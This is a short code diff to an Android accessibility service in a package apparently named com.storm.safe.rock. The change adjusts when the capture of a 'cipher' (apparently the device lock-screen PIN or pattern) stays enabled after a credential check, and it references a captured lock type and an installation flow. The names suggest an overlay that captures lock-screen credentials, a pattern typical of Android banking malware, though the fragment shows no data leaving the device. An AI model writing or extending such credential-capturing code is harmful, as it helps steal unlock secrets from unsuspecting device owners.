@@ -3488,7 +3488,9 @@ class MyAccessibilityService : AccessibilityService() {
     private fun handleCipherCredentialResult(success: Boolean) {
         android.util.Log.d(TAG, "🔐 验证结果: ${if (success) "成功" else "失败"}")
         if (success) {
-            isCipherCaptureEnabled = false
+            if (!com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
+                isCipherCaptureEnabled = false
+            }
             cipherRetryCount = 0
             // Save lock type from last captured quality before completeInstallation clears buffer
             val quality = lastCapturedCipherQuality
